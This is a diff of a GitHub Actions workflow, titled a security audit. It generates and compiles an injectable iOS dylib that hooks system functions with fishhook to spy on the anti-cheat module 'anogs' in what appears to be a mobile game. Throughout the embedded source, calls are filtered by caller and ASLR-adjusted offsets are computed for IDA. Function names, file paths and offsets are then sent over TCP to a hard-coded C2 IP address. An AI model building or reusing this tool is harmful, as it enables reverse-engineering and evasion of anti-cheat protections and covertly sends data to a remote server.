@@ -1,4 +1,4 @@
-name: Security Audit - Memory Dissection PoC
+name: Security Audit - Anogs Binary Sniper
 
 on:
   push:
@@ -6,125 +6,137 @@ on:
   workflow_dispatch:
 
 jobs:
-  build_poc:
-    name: Compile Dissection Payload
+  build_sniper:
+    name: Compile Anogs Strict Sniper
     runs-on: macos-latest
 
     steps:
       - name: Checkout Code
         uses: actions/checkout@v4
 
-      - name: Download Fishhook Submodule
+      - name: Download Fishhook
         run: |
           mkdir -p jni
           curl -sL https://raw.githubusercontent.com/facebook/fishhook/master/fishhook.c -o jni/fishhook.c
           curl -sL https://raw.githubusercontent.com/facebook/fishhook/master/fishhook.h -o jni/fishhook.h
 
-      - name: Generate C++ Payload (Main.mm)
+      - name: Generate Sniper Source
         run: |
           cat <<'EOF' > jni/main.mm
           #import <Foundation/Foundation.h>
           #import <sys/socket.h>
           #import <arpa/inet.h>
           #import <dlfcn.h>
+          #import <mach-o/dyld.h>
+          #import <sys/sysctl.h>
           #include "fishhook.h"
 
-          // ⚠️ C2 Server Configuration (Masoud RDP)
+          // ⚠️ C2 IP (Masoud RDP)
           #define C2_IP "44.192.33.117"
           #define C2_PORT 8080
 
-          // Pointers for original functions
-          static int (*orig_access)(const char *path, int amode);
-          static int (*orig_stat)(const char *path, struct stat *buf);
+          static int (*orig_sysctlbyname)(const char *name, void *oldp, size_t *oldlenp, void *newp, size_t newlen);
           static void* (*orig_dlsym)(void* handle, const char* symbol);
+          static FILE* (*orig_fopen)(const char *filename, const char *mode);
+          static int (*orig_access)(const char *path, int amode);
 
-          // إرسال البيانات للسيرفر عبر TCP
-          void ExfiltrateTelemetry(NSDictionary *telemetryData) {
+          void SendToRadar(NSDictionary *data) {
               dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
-                  NSData *jsonData = [NSJSONSerialization dataWithJSONObject:telemetryData options:0 error:nil];
-                  if (!jsonData) return;
-
+                  NSData *json = [NSJSONSerialization dataWithJSONObject:data options:0 error:nil];
+                  if (!json) return;
                   int sock = socket(AF_INET, SOCK_STREAM, 0);
                   if (sock < 0) return;
-
-                  struct sockaddr_in server_addr;
-                  server_addr.sin_family = AF_INET;
-                  server_addr.sin_port = htons(C2_PORT);
-                  inet_pton(AF_INET, C2_IP, &server_addr.sin_addr);
-
-                  struct timeval timeout = {1, 0}; 
-                  setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
-
-                  if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
-                      send(sock, [jsonData bytes], [jsonData length], 0);
-                  }
+                  struct sockaddr_in srv;
+                  srv.sin_family = AF_INET; srv.sin_port = htons(C2_PORT);
+                  inet_pton(AF_INET, C2_IP, &srv.sin_addr);
+                  struct timeval tv = {1, 0}; setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
+                  if (connect(sock, (struct sockaddr *)&srv, sizeof(srv)) == 0) send(sock, [json bytes], [json length], 0);
                   close(sock);
               });
           }
 
-          // 🔍 تشريح الذاكرة: استخراج هوية الملف والأوفست الدقيق لـ IDA Pro
-          void AnalyzeAndExfiltrate(const char* function_name, const char* target_param) {
-              // 1. الحصول على عنوان الرجوع (مكان استدعاء الدالة في الذاكرة)
+          // 🎯 القناص: فحص هوية المستدعي واستخراج الأوفست الحقيقي (Real IDA Offset)
+          BOOL IsAnogsAndReport(const char* func, const char* target, const char* extra_data) {
               void* ret_addr = __builtin_return_address(0);
               Dl_info info;
               
-              // 2. سؤال النظام: لمن يعود هذا العنوان؟
               if (dladdr(ret_addr, &info) && info.dli_fname) {
-                  // استخراج المسار الكامل للملف
-                  NSString *fullPath = [NSString stringWithUTF8String:info.dli_fname];
-                  // استخراج اسم الملف فقط (anogs أو ShadowTrackerExtra)
-                  NSString *moduleName = [fullPath lastPathComponent];
-                  NSString *callerLower = [moduleName lowercaseString];
+                  NSString *caller = [[NSString stringWithUTF8String:info.dli_fname] lowercaseString];
                   
-                  // 3. فلتر المراقبة: مراقبة الحماية واللعبة فقط
-                  if ([callerLower containsString:@"anogs"] || [callerLower containsString:@"shadowtracker"]) {
+                  // 🔥 فلتر حديدي: نستهدف anogs فقط! نتجاهل اللعبة لعدم التعليق.
+                  if ([caller containsString:@"anogs"]) {
                       
-                      // 🔥 السحر هنا: حساب الأوفست الصافي (IDA Offset)
-                      // (عنوان التنفيذ الحالي) ناقص (عنوان بداية الملف بالذاكرة)
-                      uintptr_t offset = (uintptr_t)ret_addr - (uintptr_t)info.dli_fbase;
+                      // 💡 حساب الأوفست الحقيقي للملف المشفر:
+                      // بدل أن نطرح Base Address العادي (الذي يتغير في الذاكرة المنفكة)، 
+                      // يجب طرح הـ Slide (الإزاحة العشوائية لـ ASLR) لنحصل على الأوفست المطابق لـ IDA Pro.
+                      uintptr_t slide = 0;
+                      for (uint32_t i = 0; i < _dyld_image_count(); i++) {
+                          if (strcmp(_dyld_get_image_name(i), info.dli_fname) == 0) {
+                              slide = _dyld_get_image_vmaddr_slide(i);
+                              break;
+                          }
+                      }
                       
-                      ExfiltrateTelemetry(@{
-                          @"func": [NSString stringWithUTF8String:function_name],
-                          @"offset": [NSString stringWithFormat:@"0x%lx", offset], // إرسال الأوفست بصيغة Hex
-                          @"target": target_param ? [NSString stringWithUTF8String:target_param] : @"NULL",
-                          @"caller": moduleName // هوية الملف المستدعي
+                      // IDA Offset = Return Address - ASLR Slide
+                      uintptr_t real_ida_offset = (uintptr_t)ret_addr - slide;
+                      
+                      // فلترة مسارات اللعبة المزعجة التي تسبب التعليق
+                      if (target && strstr(target, ".pak")) return YES;
+                      
+                      SendToRadar(@{
+                          @"func": [NSString stringWithUTF8String:func],
+                          @"offset": [NSString stringWithFormat:@"0x%lx", real_ida_offset],
+                          @"target": target ? [NSString stringWithUTF8String:target] : @"NULL",
+                          @"data": extra_data ? [NSString stringWithUTF8String:extra_data] : @"N/A"
                       });
+                      return YES;
                   }
               }
+              return NO;
           }
 
-          // ==================== HOOK DEFINITIONS ====================
+          // ==================== HOOKS ====================
 
-          int hk_access(const char *path, int amode) {
-              AnalyzeAndExfiltrate("access", path);
-              return orig_access(path, amode);
+          // 1. فحص الجلبريك العميق (الأخطر)
+          int hk_sysctlbyname(const char *name, void *oldp, size_t *oldlenp, void *newp, size_t newlen) {
+              IsAnogsAndReport("sysctlbyname", name, NULL);
+              return orig_sysctlbyname(name, oldp, oldlenp, newp, newlen);
           }
 
-          int hk_stat(const char *path, struct stat *buf) {
-              AnalyzeAndExfiltrate("stat", path);
-              return orig_stat(path, buf);
-          }
-
+          // 2. البحث عن دوال الغش بالذاكرة
           void* hk_dlsym(void* handle, const char* symbol) {
-              AnalyzeAndExfiltrate("dlsym", symbol);
+              IsAnogsAndReport("dlsym", symbol, NULL);
               return orig_dlsym(handle, symbol);
           }
 
-          // ==================== INJECTION ENTRY ====================
+          // 3. فتح الملفات المشبوهة لقراءة الكود منها
+          FILE* hk_fopen(const char *filename, const char *mode) {
+              IsAnogsAndReport("fopen", filename, mode);
+              return orig_fopen(filename, mode);
+          }
+
+          // 4. فحص الوجود (مع فلترة لعدم التعليق)
+          int hk_access(const char *path, int amode) {
+              static __thread bool is_logging = false;
+              if (!is_logging) {
+                  is_logging = true;
+                  IsAnogsAndReport("access", path, NULL);
+                  is_logging = false;
+              }
+              return orig_access(path, amode);
+          }
 
           __attribute__((constructor))
-          static void InjectPayload() {
+          static void init_sniper() {
               dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 2 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
-                  // نبضة البداية للتأكد من ربط الرادار
-                  ExfiltrateTelemetry(@{@"func": @"RADAR_INIT", @"offset": @"0x0", @"target": @"Connection Established", @"caller": @"System"});
-
-                  // زرع الخطافات
+                  SendToRadar(@{@"func": @"INIT"});
                   struct rebinding hooks[] = {
-                      {"access", (void *)hk_access, (void **)&orig_access},
-                      {"stat", (void *)hk_stat, (void **)&orig_stat},
-                      {"dlsym", (void *)hk_dlsym, (void **)&orig_dlsym}
+                      {"sysctlbyname", (void *)hk_sysctlbyname, (void **)&orig_sysctlbyname},
+                      {"dlsym", (void *)hk_dlsym, (void **)&orig_dlsym},
+                      {"fopen", (void *)hk_fopen, (void **)&orig_fopen},
+                      {"access", (void *)hk_access, (void **)&orig_access}
                   };
-                  rebind_symbols(hooks, 3);
+                  rebind_symbols(hooks, 4);
               });
           }
           EOF
@@ -133,12 +145,12 @@ jobs:
         run: |
           clang++ -dynamiclib -std=c++11 -arch arm64 \
           -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
-          jni/main.mm jni/fishhook.c -o Anogs-Dissection-PoC.dylib \
+          jni/main.mm jni/fishhook.c -o Anogs-Binary-Sniper.dylib \
           -framework Foundation
-          strip -x Anogs-Dissection-PoC.dylib
+          strip -x Anogs-Binary-Sniper.dylib
 
       - name: Upload Artifact
         uses: actions/upload-artifact@v4
         with:
-          name: Anogs-Dissection-PoC
-          path: Anogs-Dissection-PoC.dylib
+          name: Anogs-Binary-Sniper
+          path: Anogs-Binary-Sniper.dylib
